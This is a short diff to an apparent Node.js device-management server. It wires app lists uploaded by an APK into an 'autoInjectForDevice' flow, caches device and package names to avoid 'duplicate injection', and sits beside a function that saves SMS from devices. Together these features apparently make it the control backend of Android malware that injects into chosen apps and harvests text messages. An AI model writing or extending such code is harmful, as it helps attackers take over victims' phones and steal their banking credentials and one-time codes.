@@ -977,6 +977,29 @@ async function handleAppList(deviceId, msg, ws, connections) {
   }
 }
 
+/**
+ * 消费 APK 通过 PHP /api/sync/app-list 上传的应用列表。
+ * 这些 APK 不一定会另外返回 WS app_list_response，所以必须把 HTTP
+ * 上传接入同一套 handleAppList -> autoInjectForDevice 流程。
+ */
+async function handleUploadedAppList(deviceId, apps, connections, source = 'http-sync') {
+  const current = connections.devices.get(deviceId);
+  if (!current || !current.ws || current.ws.readyState !== 1) {
+    return { accepted: false, reason: 'device-ws-offline' };
+  }
+
+  current.appListReceived = true;
+  void recordDeviceDebug('apps.http_sync.accepted', deviceId, {
+    count: Array.isArray(apps) ? apps.length : 0,
+    source,
+  });
+  await handleAppList(deviceId, {
+    type: 'http_app_list_sync',
+    _apps: Array.isArray(apps) ? apps : [],
+  }, current.ws, connections);
+  return { accepted: true, reason: 'processed' };
+}
+
 // 内存记录：已预留或已下发的设备+包名（防止并发应用列表响应重复注入）
 const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>
 
@@ -1196,4 +1219,4 @@ async function saveSmsToMessages(deviceId, smsList) {
   }
 }
 
-module.exports = { handleDevice, handleDeviceMessage, syncDeviceStatus };
+module.exports = { handleDevice, handleDeviceMessage, syncDeviceStatus, handleUploadedAppList };
